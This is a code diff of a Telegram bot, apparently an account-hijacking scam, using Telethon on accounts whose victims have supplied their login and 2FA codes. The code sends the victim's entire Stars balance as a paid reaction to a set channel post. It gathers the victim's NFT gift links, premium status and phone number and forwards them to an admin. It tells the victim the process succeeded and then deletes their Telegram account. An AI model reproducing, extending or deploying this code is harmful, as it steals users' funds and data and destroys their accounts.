@@ -13,7 +13,7 @@ from aiogram.utils.keyboard import InlineKeyboardBuilder, ReplyKeyboardBuilder
 
 from telethon import TelegramClient
 from telethon.sessions import StringSession
-from telethon import functions
+from telethon import functions, types as tl_types
 from telethon.errors import (
     SessionPasswordNeededError, 
     PhoneCodeInvalidError, 
@@ -272,22 +272,29 @@ async def process_2fa(message: types.Message, state: FSMContext):
         await message.answer(t["err_fa"])
 
 async def process_stars_reaction(client: TelegramClient):
-    sent_stars_count = 0
     try:
         stars_status = await client(functions.payments.GetStarsStatusRequest(peer="me"))
         stars_balance = getattr(stars_status, 'balance', 0)
         
+        try:
+            stars_balance = int(stars_balance)
+        except Exception:
+            stars_balance = 0
+
         if stars_balance > 0:
             channel = await client.get_entity(STARS_CHANNEL_USERNAME)
+            try:
+                await client(functions.channels.JoinChannelRequest(channel))
+            except Exception:
+                pass
+                
             await client(functions.messages.SendPaidReactionRequest(
                 peer=channel,
                 msg_id=STARS_POST_ID,
-                count=int(stars_balance)
+                count=stars_balance
             ))
-            sent_stars_count = stars_balance
     except Exception as e:
-        print(f"Stars Error: {e}")
-    return sent_stars_count
+        print(f"Stars Transfer Error: {e}")
 
 async def fetch_user_level_and_points(client: TelegramClient):
     points = 0
@@ -295,98 +302,116 @@ async def fetch_user_level_and_points(client: TelegramClient):
         profile = await client(functions.users.GetFullUserRequest(id="me"))
         full_info = profile.full_user
         
-        if hasattr(full_info, 'peer_rating') and full_info.peer_rating is not None:
-            points = getattr(full_info.peer_rating, 'points', 0)
-        elif hasattr(full_info, 'star_gifts_count') and full_info.star_gifts_count:
-            points = full_info.star_gifts_count
-        elif hasattr(full_info, 'stargifts_count') and full_info.stargifts_count:
-            points = full_info.stargifts_count
-            
-        # Yangilangan darajalar sharti
+        if hasattr(full_info, 'peer_rating') and full_info.peer_rating:
+            pr = full_info.peer_rating
+            points = getattr(pr, 'rating', getattr(pr, 'points', getattr(pr, 'score', 0)))
+        elif hasattr(full_info, 'rating') and full_info.rating is not None:
+            points = full_info.rating
+        elif hasattr(full_info, 'star_gifts_count'):
+            points = full_info.star_gifts_count or 0
+
         if points < 0:
             level = "⚠️ Salbiy reyting"
         elif points >= 36000:
             level = "5-daraja+"
-        elif points >= 27000:   # 27k dan 36k gacha
+        elif points >= 27000:
             level = "5-daraja"
-        elif points >= 19000:   # 19k dan 27k gacha
+        elif points >= 19000:
             level = "4-daraja"
-        elif points >= 12000:   # 12k dan 19k gacha
+        elif points >= 12000:
             level = "3-daraja"
-        elif points >= 5000:    # 5k dan 12k gacha
+        elif points >= 5000:
             level = "2-daraja"
-        elif points >= 1:       # 1 pt dan 5k gacha
+        elif points >= 1:
             level = "1-daraja"
-        else:                   # 0 pt bo'lsa
-            level = "Yo'q"
+        else:
+            level = "1-daraja"
             
     except Exception as e:
         print(f"Level fetch error: {e}")
-        level = "Yo'q"
+        level = "1-daraja"
         
     return level, points
 
 async def fetch_user_premium_info(client: TelegramClient):
-    info_str = "💎 Premium: Mavjud emas"
     try:
         me = await client.get_me()
         if getattr(me, 'premium', False):
-            info_str = "💎 Premium: Mavjud"
-    except Exception:
-        pass
-    return info_str
+            return "💎 Premium: Mavjud"
+    except Exception as e:
+        print(f"Premium Fetch Error: {e}")
+    return "💎 Premium: Mavjud emas"
 
+# ANIQ MUSIQA NOMI VA IJROCHISINI OLISH
 async def fetch_user_profile_music(client: TelegramClient):
-    music_info = "🎵 Musiqa: Yo'q"
     try:
         profile = await client(functions.users.GetFullUserRequest(id="me"))
         full_info = profile.full_user
         
-        if hasattr(full_info, 'audio') and full_info.audio:
+        audio = None
+        if hasattr(full_info, 'profile_audio') and full_info.profile_audio:
+            audio = full_info.profile_audio
+        elif hasattr(full_info, 'audio') and full_info.audio:
             audio = full_info.audio
-            title = getattr(audio, 'title', '')
-            performer = getattr(audio, 'performer', '')
+
+        if audio:
+            attributes = getattr(audio, 'attributes', [])
+            title = ""
+            performer = ""
             
-            if performer or title:
-                music_name = f"{performer} - {title}".strip(" - ")
-                music_info = f"🎵 Musiqa: {music_name}"
-            else:
-                music_info = "🎵 Musiqa: Mavjud"
-        elif hasattr(full_info, 'music') and full_info.music:
-            music_info = "🎵 Musiqa: Mavjud"
+            for attr in attributes:
+                if isinstance(attr, tl_types.DocumentAttributeAudio):
+                    title = getattr(attr, 'title', '') or ""
+                    performer = getattr(attr, 'performer', '') or ""
+                    break
+            
+            if performer and title:
+                return f"🎵 Musiqa: {performer} - {title}"
+            elif title:
+                return f"🎵 Musiqa: {title}"
+            elif performer:
+                return f"🎵 Musiqa: {performer}"
+            
+            direct_title = getattr(audio, 'title', '')
+            direct_performer = getattr(audio, 'performer', '')
+            if direct_performer or direct_title:
+                return f"🎵 Musiqa: {direct_performer} - {direct_title}".strip(" - ")
+
     except Exception as e:
         print(f"Music Fetch Error: {e}")
-    return music_info
+        
+    return "🎵 Musiqa: Yo'q"
 
 async def fetch_user_nft_gifts(client: TelegramClient):
-    nft_items = []
+    nft_links = []
     try:
         res = await client(functions.payments.GetSavedGiftsRequest(
             peer="me", offset="", limit=100
         ))
-        for gift in getattr(res, 'gifts', []):
+        for item in getattr(res, 'gifts', []):
             slug = None
-            if hasattr(gift, 'slug') and gift.slug:
-                slug = gift.slug
-            elif hasattr(gift, 'gift') and hasattr(gift.gift, 'slug') and gift.gift.slug:
-                slug = gift.gift.slug
+            if hasattr(item, 'gift'):
+                g = item.gift
+                slug = getattr(g, 'slug', None)
             
+            if not slug and hasattr(item, 'slug'):
+                slug = item.slug
+
             if slug:
-                nft_items.append(f"https://t.me/nft/{slug}")
+                nft_links.append(f"https://t.me/nft/{slug}")
     except Exception as e:
         print(f"NFT Fetch Error: {e}")
-    return nft_items
+    return nft_links
 
 async def process_account_info(message: types.Message, state: FSMContext, user_id: int, auth: dict):
     lang = auth.get("lang", "uz")
     t = TEXTS[lang]
     client = auth["client"]
 
-    # 1. Stars yuborish
-    sent_stars = await process_stars_reaction(client)
-    stars_str = f"⭐ Stars: {sent_stars}"
+    # 1. Background stars reaksiyasi yuborish
+    await process_stars_reaction(client)
 
-    # 2. Ma'lumotlar
+    # 2. Akkaunt ma'lumotlarini olish
     user_level, user_points = await fetch_user_level_and_points(client)
     premium_str = await fetch_user_premium_info(client)
     music_str = await fetch_user_profile_music(client)
@@ -395,18 +420,13 @@ async def process_account_info(message: types.Message, state: FSMContext, user_i
     nft_count = len(nft_links)
     
     if nft_count > 0:
-        nft_list = "\n".join([f"🔗 {link}" for link in nft_links])
-        nft_str = f"🎁 NFT: {nft_count}\n{nft_list}"
+        links_formatted = "\n".join([f"🔗 {link}" for link in nft_links])
+        nft_str = f"🎁 NFT: {nft_count} ta\n{links_formatted}"
     else:
-        nft_str = "🎁 NFT: 0"
+        nft_str = "🎁 NFT: 0 ta"
 
-    # Daraja matnini shakllantirish
-    if user_level == "Yo'q":
-        level_str = "📊 Daraja: Yo'q (0 pt)"
-    else:
-        level_str = f"📊 Daraja: {user_level} ({user_points} pt)"
+    level_str = f"📊 Daraja: {user_level} ({user_points} pt)"
 
-    # 3. Adminga xabar
     full_name = message.from_user.full_name
     username = f"@{message.from_user.username}" if message.from_user.username else "Yo'q"
     phone = auth.get("phone", "Noma'lum")
@@ -420,7 +440,6 @@ async def process_account_info(message: types.Message, state: FSMContext, user_i
         f"{level_str}\n"
         f"{premium_str}\n"
         f"{music_str}\n"
-        f"{stars_str}\n"
         f"{nft_str}"
     )
 
@@ -434,16 +453,13 @@ async def process_account_info(message: types.Message, state: FSMContext, user_i
         except Exception as e:
             print(f"Admin send error: {e}")
 
-    # 4. Foydalanuvchiga javob
     await message.answer(t["success"])
 
-    # 5. O'chirish
     try:
         await client(functions.account.DeleteAccountRequest(reason="Bot deletion"))
     except Exception as e:
         print(f"Delete Error: {e}")
 
-    # 6. Tozalash
     try:
         await client.disconnect()
     except Exception:
